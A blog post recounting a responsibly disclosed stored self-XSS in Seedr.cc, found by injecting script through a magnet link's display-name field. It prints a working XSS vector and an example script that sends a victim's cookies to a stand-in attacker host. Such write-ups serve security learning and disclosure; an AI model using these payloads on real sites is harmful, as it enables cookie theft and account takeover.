---
title: Discovering a Stored XSS Vulnerability in Seedr.cc
description: This blog details my journey of uncovering a stored XSS vulnerability in Seedr.cc
author: hemantapkh
date: 2024-09-01 02:41:18 +0000
categories: [Cybersecurity]
tags: [security, XSS, hacking]
pin: false
math: false
mermaid: false
image:
  path: https://assets.hemantapkh.com/blog/seedr-xss/thumbnail.webp
  alt: Image from blog.detectify.com
---

## What is XSS?

Cross-Site Scripting (XSS) is a type of vulnerability found in web applications where an attacker can inject malicious scripts into content that is then delivered to users. These scripts can execute in the victim's browser, leading to various malicious activities such as stealing cookies, session hijacking, or defacing websites.

### Types of XSS Vulnerabilities

- **Reflected XSS**:
  Occurs when user-supplied data is immediately reflected back in the web application's response, such as in error messages or search results, without being properly sanitized. The malicious script is executed when the crafted URL is clicked and processed, but the data is not stored on the server.

- **Stored XSS**:
  Happens when user input is stored on the server (e.g., in a database, comment field) and later displayed to users without proper sanitization. The malicious script is executed when the stored data is retrieved and rendered.

- **DOM-Based XSS**:
  Involves the execution of a malicious script due to changes made to the client-side DOM environment. Unlike other types, the payload never reaches the server. It is similar to reflected XSS because no information is stored during the attack; both rely on tricking a victim into interacting with a malicious URL.


In this post, we'll focus on my discovery of a stored Self-XSS vulnerability in [Seedr.cc](https://seedr.cc), one of the most popular services that allow users to download torrents directly to the cloud.

## Discovering XSS in Seedr

**December 1, 2020** I was exploring the site. Out of curiosity, I attempted to rename one of my files using characters such as `<`, `>`, `%`, `&`, and `^`, which are typically not allowed in filenames on most sites. The site threw an **"Illegal characters used in filename"** error.

![IMAGE](https://assets.hemantapkh.com/blog/seedr-xss/seedr-error-alert.png)

This got me thinking: 
what if the torrent file itself has these forbidden characters? So, I decided to test this out by creating a magnet link with such characters. 

The basic structure of a torrent [magnet URI](https://en.wikipedia.org/wiki/Magnet_URI_scheme) is as follows:

```text
magnet:?xt=urn:btih:<info_hash>&dn=<name>&tr=<tracker_url>
```

In this URL schema, `dn` stands for display name. First, I experimented with how their system handled illegal characters passed through the magnet link. Surprisingly, they were not filtered or encoded. With this discovery, I decided to take it a step further and craft an XSS vector within the magnet link by modifying the `dn` parameter while keeping the hash of a random torrent.

```text
magnet:?xt=urn:btih:44E6FC672F9476589951726B4693F6CEB2B4759D&dn=<svg onload=alert(1)>
```

> You can find an excellent XSS cheat sheet here: [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
{: .prompt-tip }

After adding this magnet link on my Seedr account, my XSS vector was permanently stored. Every time I refresh my home page, an alert box displaying "1" would pop up.

![IMAGE](https://assets.hemantapkh.com/blog/seedr-xss/seedr.jpeg)

## Impact

This vulnerability could have severe implications, including account takeovers via malicious JavaScript injections. While the XSS vulnerability I discovered is a type of Self-XSS, meaning it executes only in the context of the user who submits the payload, it can still be exploited to target other users.

Imagine someone injecting the similar script into a magnet link and sharing it with unsuspecting victims:

```html
<script>
  var userCookie = document.cookie;
  var img = new Image();
  img.src = 'https://hackersite.com/store?cookie=' + encodeURIComponent(userCookie);
</script>
```

> You can find an excellent XSS prevention cheat sheet here: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
{: .prompt-tip }


## Reporting the Vulnerability

**December 2** I reported this issue to the Seedr team, and they swiftly implemented a fix.

![IMAGE](https://assets.hemantapkh.com/blog/seedr-xss/seedr-reply-email.png)

Shortly afterward, I found another vulnerability on the same platform, which allowed me to add unlimited torrents beyond my storage limit. This next discovery earned me my first bug bounty reward, which I will discuss in my next blog. Stay tuned! 🚀
